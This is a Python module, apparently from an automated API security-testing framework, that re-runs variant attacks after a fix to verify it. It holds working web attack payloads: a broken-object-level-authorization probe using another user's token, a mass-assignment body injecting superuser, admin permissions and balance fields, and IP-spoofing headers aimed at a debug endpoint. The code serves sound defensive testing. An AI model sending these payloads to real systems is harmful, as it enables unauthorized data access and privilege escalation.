"""
Variant attack runner for Phase 8 Re-test and Verification (RESEARCH.md §5 post-fix robustness rate).
Executes adapted attack variants (mutated payloads, alternative parameters, or encodings)
after the original exploit is confirmed blocked.
"""
from __future__ import annotations

import json
import logging
from typing import Any

from app.agents.evaluator.schemas import EvaluatedFinding
from app.agents.verifier.schemas import VariantAttackResult
from app.security.http_client import ScopeLockedHttpClient
from app.security.oracles import BOLAOracle, BOPLAMassAssignOracle, SecurityMisconfigOracle
from app.targets.handle import TargetHandle

logger = logging.getLogger(__name__)


class VariantAttackRunner:
    """
    Executes an adapted attack variant targeting the same underlying vulnerability class.
    """

    async def run_variant_attack(
        self,
        *,
        finding: EvaluatedFinding,
        target_handle: TargetHandle,
    ) -> VariantAttackResult:
        """
        Execute an adapted attack mutation against target_handle.base_url.
        """
        category = finding.category.upper()

        try:
            async with ScopeLockedHttpClient(base_url=target_handle.base_url) as client:
                if category == "BOLA":
                    # Variant 1: Query parameter mutation and trailing slash
                    variant_kind = "query_mutation_and_slash"
                    url = "/documents/doc_bob_02/?include_metadata=true"
                    headers = {"Authorization": "Bearer alice-token-123"}
                    resp = await client.get(url, headers=headers)

                    oracle_res = BOLAOracle.evaluate(
                        request_principal="usr_alice_01",
                        target_owner="usr_bob_02",
                        response_status=resp.status_code,
                        response_body=resp.text,
                    )
                    return VariantAttackResult(
                        ran=True,
                        exploited=oracle_res.fired,
                        variant_kind=variant_kind,
                        rationale=f"Variant probe on {url}: {oracle_res.rationale}",
                    )

                elif category == "BOPLA_MASS_ASSIGN":
                    # Variant 2: Alternate privileged fields (is_superuser, permissions, balance)
                    variant_kind = "alternate_privileged_fields"
                    url = "/users/usr_alice_01/profile"
                    headers = {"Authorization": "Bearer alice-token-123"}
                    payload = {
                        "display_name": "Alice Variant",
                        "bio": "Variant mass assignment injection.",
                        "is_superuser": True,
                        "permissions": ["admin", "root"],
                        "balance": 1000000,
                    }
                    write_resp = await client.put(url, json=payload, headers=headers)

                    read_resp = await client.get("/users/usr_alice_01", headers=headers)
                    read_text = read_resp.text
                    try:
                        read_json = json.loads(read_text)
                        if isinstance(read_json, dict) and "user" in read_json and isinstance(read_json["user"], dict):
                            read_text = json.dumps(read_json["user"])
                    except Exception:
                        pass

                    oracle_res = BOPLAMassAssignOracle.evaluate(
                        injected_fields={"is_superuser": True, "balance": 1000000},
                        write_status=write_resp.status_code,
                        read_status=read_resp.status_code,
                        read_body=read_text,
                    )
                    return VariantAttackResult(
                        ran=True,
                        exploited=oracle_res.fired,
                        variant_kind=variant_kind,
                        rationale=f"Variant probe with alternate fields: {oracle_res.rationale}",
                    )

                elif category == "SECURITY_MISCONFIG":
                    # Variant 3: Trailing slash with client IP bypass headers
                    variant_kind = "trailing_slash_ip_bypass_headers"
                    url = "/debug/config/?debug=true"
                    headers = {
                        "X-Forwarded-For": "127.0.0.1",
                        "X-Real-IP": "127.0.0.1",
                        "X-Original-URL": "/debug/config",
                    }
                    resp = await client.get(url, headers=headers)

                    oracle_res = SecurityMisconfigOracle.evaluate(
                        endpoint_path=url,
                        response_status=resp.status_code,
                        response_body=resp.text,
                        response_headers=dict(resp.headers),
                    )
                    return VariantAttackResult(
                        ran=True,
                        exploited=oracle_res.fired,
                        variant_kind=variant_kind,
                        rationale=f"Variant probe on {url}: {oracle_res.rationale}",
                    )

                else:
                    return VariantAttackResult(
                        ran=False,
                        exploited=False,
                        variant_kind="none",
                        rationale="No variant attack defined for category",
                    )

        except Exception as exc:
            logger.debug("Variant attack failed: %s", exc)
            return VariantAttackResult(
                ran=False,
                exploited=False,
                variant_kind="error",
                rationale=f"Variant attack transport error: {exc}",
            )
